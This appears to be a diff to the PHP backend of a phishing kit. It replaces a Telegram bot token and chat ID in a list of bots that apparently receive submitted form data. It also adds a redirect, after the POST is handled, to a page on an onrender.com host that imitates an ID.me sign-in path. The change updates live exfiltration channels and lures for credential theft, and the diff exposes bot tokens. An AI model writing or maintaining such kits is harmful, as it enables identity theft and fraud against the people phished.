@@ -6,8 +6,8 @@ $telegram_bots = [
         'chat_id' => '1325797388'
     ],
     [
-        'token' => '7395338291:AAFiyILeZdxyENeRvcaYgZ93vnv2DYyW_XM',
-        'chat_id' => '8160582785'
+        'token' => '7810816894:AAE7eOvKsbTjvCr3zdpgsIf-vXqddsYY0Rk',
+        'chat_id' => '7678714988'
     ]
     // Add more bots here if needed
 ];
@@ -201,6 +201,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
 
 
+    header("Location:https://upstart-loans.onrender.com/api.id.me/en/session/new.php");
 
     
 exit;
